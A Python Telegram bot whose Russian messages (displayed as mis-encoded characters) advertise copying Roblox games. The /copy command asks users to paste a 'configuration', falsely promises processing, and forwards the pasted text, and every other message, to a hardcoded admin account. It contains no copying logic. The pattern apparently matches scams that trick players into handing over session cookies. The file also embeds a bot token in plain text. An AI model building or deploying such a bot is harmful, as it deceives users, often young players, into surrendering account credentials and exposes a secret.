from telebot import TeleBot, types
import os

bot = TeleBot("8391657012:AAG0ZIXQje_01GBHTBCMlQ9omanwxtX104I")
ADMIN_ID = 5512960388

# –ö–æ–º–∞–Ω–¥–∞ /start
@bot.message_handler(commands=['start'])
def start(message):
    text = """–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –∏–≥—Ä Roblox.

–ö–æ–º–∞–Ω–¥—ã:
/copy - –Ω–∞—á–∞—Ç—å –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ
/tutor - –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è

–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –∏–≥—Ä—ã!"""
    bot.send_message(message.chat.id, text)

    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É
    bot.send_message(ADMIN_ID, f"üÜï –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {message.from_user.first_name}")

# –ö–æ–º–∞–Ω–¥–∞ /copy
@bot.message_handler(commands=['copy'])
def copy_cmd(message):
    msg = bot.send_message(message.chat.id, "üìù –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç-–∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é:")
    bot.register_next_step_handler(msg, process_config)

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
def process_config(message):
    bot.send_message(message.chat.id, "‚úÖ –ü—Ä–∏–Ω—è—Ç–æ –≤ –æ–±—Ä–∞–±–æ—Ç–∫—É! 5 –º–∏–Ω—É—Ç - –Ω–µ—Å–∫–æ–ª—å–∫–æ —á–∞—Å–æ–≤.")
    bot.send_message(ADMIN_ID, f"üìã –ö–æ–Ω—Ñ–∏–≥ –æ—Ç {message.from_user.first_name}:\n{message.text}")

# –ö–æ–º–∞–Ω–¥–∞ /tutor
@bot.message_handler(commands=['tutor'])
def tutor(message):
    try:
        bot.send_message(message.chat.id, "üìπ –í–∏–¥–µ–æ-–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:")

        # –ü—É—Ç—å –∫ –≤–∏–¥–µ–æ —Ñ–∞–π–ª—É –Ω–∞ PythonAnywhere
        video_path = "/home/weizzybro/tutor.mp4"

        # –û—Ç–∫—Ä—ã–≤–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–∏–¥–µ–æ —Ñ–∞–π–ª
        with open(video_path, 'rb') as video_file:
            bot.send_video(message.chat.id, video_file, caption="–°–º–æ—Ç—Ä–∏ –≤–∏–¥–µ–æ-–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –±–æ—Ç–∞!")

    except Exception as e:
        bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–∏–¥–µ–æ")
        bot.send_message(ADMIN_ID, f"–û—à–∏–±–∫–∞ –≤–∏–¥–µ–æ: {e}")

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –õ–Æ–ë–û–ì–û —Ç–µ–∫—Å—Ç–∞
@bot.message_handler(content_types=['text'])
def forward_all(message):
    bot.send_message(ADMIN_ID, f"üí¨ –û—Ç {message.from_user.first_name}:\n{message.text}")
    bot.send_message(message.chat.id, "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /copy –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏")

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")
bot.polling()